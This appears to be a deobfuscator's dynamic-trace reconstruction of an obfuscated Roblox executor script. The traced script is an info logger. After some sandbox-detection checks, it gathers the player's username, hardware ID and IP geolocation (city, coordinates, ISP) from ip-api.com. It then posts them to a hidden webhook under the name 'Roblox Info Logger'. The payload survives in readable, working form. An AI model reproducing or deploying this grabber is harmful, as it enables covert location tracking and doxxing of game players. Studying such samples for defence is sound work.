-- Deobfuscated by deobf (dynamic trace)
-- source: 02fdcccbab6545c1.lua
-- NOTE: reconstructed from observed behaviour; branches that were not taken
--       during the trace are missing and conditions are only noted in comments.
-- run status: script error: Luraph Script:328: Luraph Script:320: Script:3: attempt to compare userdata < number
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/newout/02fdcccbab6545c1.deobf.luau.harness.luau:5334
--   Script:3
--   Script:3
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/newout/02fdcccbab6545c1.deobf.luau.harness.luau:5339
--   
-- 61 statements recorded in 0.35s
-- URLs requested:
--   http://ip-api.com/json/
--   https://games.roblox.com/v1/games/multiget-place-details?placeIds=0
--   [REDACTED_WEBHOOK_URL]
-- non-standard globals touched: gethwid

task.spawn(function()
end)

task.spawn(function()
end)

task.delay(743, function()
end)

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.Size = UDim2.new(0, 122, 0, 135)
Frame.Parent = ScreenGui
local Path2D = Instance.new("Path2D")
Path2D.Parent = Frame
Path2D:SetControlPoints({ Path2DControlPoint.new(UDim2.new(0, -6, 0.5, -9), UDim2.new(0, 0, 0.125, -4), UDim2.new(0, 0, 0, 0)), Path2DControlPoint.new(UDim2.new(0, 6, 0.5, 0), UDim2.new(0, 0, 0, 0), UDim2.new(0, -8, 0, 2)), Path2DControlPoint.new(UDim2.new(0.25, 6, 0.375, 5), UDim2.new(0, 3, 0, -4), UDim2.new(0.125, 6, 0.0625, -5)), Path2DControlPoint.new(UDim2.new(0.5, 7, 0.25, -3), UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 0)), Path2DControlPoint.new(UDim2.new(0, -3, 0, -6), UDim2.new(0.125, 3, 0.125, 2), UDim2.new(-0.125, -6, 0, -6)), Path2DControlPoint.new(UDim2.new(0, -3, 0.5, -6), UDim2.new(0.125, -1, 0, -4), UDim2.new(0, -2, 0, -8)) })
Path2D:GetLength()
Path2D:GetPositionOnCurve(0.66666668653488159)
Path2D:GetPositionOnCurve(0.5)
Path2D:GetPositionOnCurve(0.20000000298023224)
Path2D:GetTangentOnCurve(0.45454546809196472)
Path2D:GetTangentOnCurve(0.5625)
Path2D:GetTangentOnCurve(0.60000002384185791)
Path2D:GetPositionOnCurveArcLength(0.40000000596046448)
Path2D:GetPositionOnCurveArcLength(0.5)
Path2D:GetPositionOnCurveArcLength(0.75)
Path2D:GetTangentOnCurveArcLength(0.38461539149284363)
Path2D:GetTangentOnCurveArcLength(0.75)
ScreenGui:Destroy()

local connection = game.Destroying:Connect(function()
end)

connection:Disconnect()

local connection2 = workspace.Destroying:Connect(function()
end)

connection2:Disconnect()
local Folder = Instance.new("Folder")

local connection3 = Folder.Destroying:Connect(function()
end)

connection3:Disconnect()
Folder:GetChildren()
Folder:Destroy()
local Folder2 = Instance.new("Folder", Folder)

local connection4 = Folder2.Destroying:Connect(function()
end)

connection4:Disconnect()
Folder2.Name = "1290694603"
Folder:WaitForChild("1290694603")
Folder:Destroy()
Folder2:Destroy()
local HttpService = game:GetService("HttpService")

local connection5 = HttpService.Destroying:Connect(function()
end)

connection5:Disconnect()
local RunService = game:GetService("RunService")

local connection6 = RunService.Destroying:Connect(function()
end)

connection6:Disconnect()
-- loadstring() of 2444 bytes: " --[[\n\t\t\t\t .@%(/*,.......      ...,,*/(#%&@@.\n\t\t\t (*   ,/(#%%&&@@@@&%((////(((##%###((/**,,.     ,//(&.\n\t\t   /* .%@@@@@@@@%,  .(&@@@&&&&&&@@@@@@&#(*,........*%@@@(.  ,#.\n\t\t */ .&@@@@@@@*  (%,   *(&&@@"
local Players = game:GetService("Players")
-- identifyexecutor() -> "Wave"
local result = gethwid()
local response = game:HttpGet("http://ip-api.com/json/")
local data = HttpService:JSONDecode(response)
local UserInputService = game:GetService("UserInputService")
local response2 = game:HttpGet("https://games.roblox.com/v1/games/multiget-place-details?placeIds=0")
local data2 = HttpService:JSONDecode(response2)

local json = HttpService:JSONEncode({
	avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=0&width=420&height=420&format=png",
	embeds = {
		{
			color = 16777215,
			fields = {
				{ inline = true, name = "Username", value = "```" .. Players.LocalPlayer.Name .. "```" },
				{ inline = true, name = "Display Name", value = "```" .. Players.LocalPlayer.DisplayName .. "```" },
				{ inline = true, name = "User ID", value = "```0```" },
				{ inline = true, name = "Account Age", value = "```0 days```" },
				{
					inline = false,
					name = "Profile Link",
					value = "[View Profile](https://www.roblox.com/users/0/profile)"
				}
			},
			thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=0&width=420&height=420&format=png" },
			title = "Roblox Player Information"
		},
		{
			color = 16777215,
			fields = {
				{ inline = true, name = "IP", value = "```" .. data.query .. "```" },
				{ inline = true, name = "Country", value = "```" .. data.country .. "```" },
				{ inline = true, name = "Region", value = "```" .. data.regionName .. "```" },
				{ inline = true, name = "City", value = "```" .. data.city .. "```" },
				{ inline = true, name = "Latitude", value = "```" .. tostring(data.lat) .. "```" },
				{ inline = true, name = "Longitude", value = "```" .. tostring(data.lon) .. "```" },
				{ inline = true, name = "Postal", value = "```" .. data.zip .. "```" },
				{ inline = true, name = "ASN", value = "```" .. data.as .. "```" },
				{ inline = true, name = "Org", value = "```" .. data.org .. "```" },
				{ inline = true, name = "ISP", value = "```" .. data.isp .. "```" },
				{ inline = true, name = "Device", value = "```PC```" },
				{ inline = true, name = "Executor", value = "```Wave```" },
				{ inline = true, name = "HWID", value = "```" .. result .. "```" },
				{ inline = true, name = "Game", value = "```" .. data2[1].name .. "```" }
			},
			footer = { text = "Logged at 2026-09-26 15:02:17" },
			title = "Other Information"
		}
	},
	username = "Roblox Info Logger"
})

request({
	Body = json,
	Headers = { ["Content-Type"] = "application/json" },
	Method = "POST",
	Url = "[REDACTED_WEBHOOK_URL]"
})

local TweenService = game:GetService("TweenService")
Players.LocalPlayer:WaitForChild("PlayerGui")
-- identifyexecutor() -> "Wave"
readfile("swag_key_save.txt")
